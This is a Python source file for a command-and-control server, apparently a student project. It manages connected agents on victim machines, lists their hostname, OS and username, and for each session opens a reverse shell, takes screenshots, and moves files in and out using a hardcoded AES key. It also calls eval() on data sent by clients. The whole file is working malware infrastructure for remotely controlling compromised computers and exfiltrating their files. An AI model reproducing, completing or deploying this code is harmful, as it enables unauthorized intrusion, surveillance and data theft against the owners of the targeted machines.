from art import *
import socket
import threading
import sys
import time,os
from prettytable import PrettyTable


from Crypto.Cipher import AES

key = b'ZiyaGadimli12345'
nonce = b'ZiyaGadimli54321'

ciper = AES.new(key, AES.MODE_EAX, nonce)

connections = []

tprint("Com & conTROLL")

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5050

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Bind the socket to host and port
server_socket.bind((SERVER_HOST, SERVER_PORT))

# Listen for incoming connections
server_socket.listen(5)
# print(f"Server listening on {SERVER_HOST}:{SERVER_PORT}")

def ss(session):
    client_socket = connections[session]['socket']
    path = client_socket.recv(1024).decode()
    if not os.path.isdir(path) or os.path.isfile(path):
        print(path)
    else:
        print("recieved path")  #TODO DELETE
        print(path) #TODO DELETE

        download_path = 'C:\\Users\\Student\\Desktop\\piton\\Command-Control\\main\\ss' #CHANGE THIS PATH

        download(from_=path, where=download_path, session=session)
        print("done!")


def shell(session):

    conn = connections[session]['socket']
    ip = connections[session]['address'][0]
    port = connections[session]['address'][1]

    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()
        log(f'Shell command executed on [{ip}:{port}]:{command}')
        if command == 'exit':
            break

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(0.5)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])


def list():
    table = PrettyTable(["ID", "IP", "port", 'Hostname', 'OS', 'Username'])

    for i in range(len(connections)):
        table.add_row([i,connections[i]['address'][0],connections[i]['address'][1],connections[i]['cred']['hostname'],
        connections[i]['cred']['OS'],connections[i]['cred']['username']])

    print('\n')
    print(table)
    
    print("\nUse number for interaction with socket. For example 'use 0'")  #MAKE HERE BEAUTIFUL

    # print(connections)


def session_help():
    print("""
    download    Usage: 'download <from(target's path)> <where(your path)>'
    upload      Usage:  'upload <where(your path)> <from(target's path)>'
    shell       Opens reverse shell on agent    
    ss          Takes screenshoot on target machine and sends it to the server
    exit        exiting from current session
    help        shows this page
    """)


def help():
    print("""
    list    Lists all connected clients                                        
    use     Usage: 'use <number of session>' interracting with specific target    
    help    shows this page    

    """)


def use(session):
    try:
        session = int(session)
        ip = connections[session]['address'][0]
        port = connections[session]['address'][1]

        if connections[session]:
            client_socket = connections[session]['socket']
            while 1:
                command = input(f"\n[*] You're interacting with {session} Enter command > ").lower()

                log(f'Command executed on [{ip}:{port}]:{command}')

                if command == 'exit':                         
                    break                                           
                
                client_socket.send(command.encode())
                command = command.split(" ")      

                match command[0]:
                    case  'download':
                        download(from_=command[1], where=command[2], session=session)
                    case 'upload':
                        upload(what=command[1], where=command[2], session=session)
                    case 'shell':
                        shell(session=session)
                    case 'ss':
                        ss(session=session)
                    case 'help':
                        session_help()
    except ValueError:
        print("\n[WARNING] Invalid ID number!")
    except ConnectionAbortedError:
        print("\n[*] Connection lost!")
        connections.remove(connections[session])

def exit():
    server_socket.close()
    time.sleep(1)


def listen_incoming():
    while True:
        # Accept incoming connection    
        client_socket, address = server_socket.accept()
        cred = client_socket.recv(4096).decode()
        cred = eval(cred) #TODO change eval to json.loads
        # connections.append(cred)
        log(f'Connection recieved from:{address}')
        connection = {"address": address, 'socket': client_socket, 'cred':cred}
        connections.append(connection)


def download(from_, where, session):            #ENCRYPTION DONE!
    if os.path.isfile(from_) and os.path.isdir(where):
        socket = connections[session]['socket']
        socket.send(from_.encode())
        time.sleep(0.3)
        file_name = from_.split('\\')[-1]
        if not where.endswith('\\'):
            where += '\\'
        where += file_name
        file = open(where, 'ab')
        a = socket.recv(4096)
        a = ciper.decrypt(a)
        while a != b"\n\r":
            file.write(a)
            a = socket.recv(4096)
            a = ciper.decrypt(a)
        file.close()
        print("File sent succesfully!")
    else:
        print("\n[*] It looks like the path you entered is not path.Double check it please")

def upload(what, where, session):
    socket = connections[session]['socket']
    socket.send(where.encode())
    time.sleep(0.3)
    file_name = what.split('\\')[-1]
    socket.send(file_name.encode())
    file = open(what, 'rb')
    a = file.read(4096)
    a = ciper.encrypt(a)
    while a:
        socket.send(a)
        a = file.read(4096)
        a = ciper.encrypt(a)
    time.sleep(1)
    socket.send(ciper.encrypt(b"\n\r"))
    file.close()

def log(log):
    with open('example.log', 'a') as f:
        date = time.asctime().split()
        f.write(f'[INFO]{date[2]}-{date[1]}-{date[4]} {date[3]}:{log}\n')  
    f.close() 
    

threading.Thread(target=listen_incoming).start()


while 1:
    try:
        command = input("\n[*] Enter command > ").lower()

        log(f'Command executed:{command}')
        
        command = command.split(" ")

        match command[0]:
            case 'clear':
                os.system('cls')
            case "list":
                list()
            case "help":
                help()
            case 'exit':
                exit()
                break
            case 'use':
                try:
                    if len(command) > 2:
                        print("\n[WARNING] Invalid syntax")
                    else:
                        use(command[1])
                except IndexError:
                    print("\n[INFO] ID does not exist")
            
    except OSError:
        print("exiting....")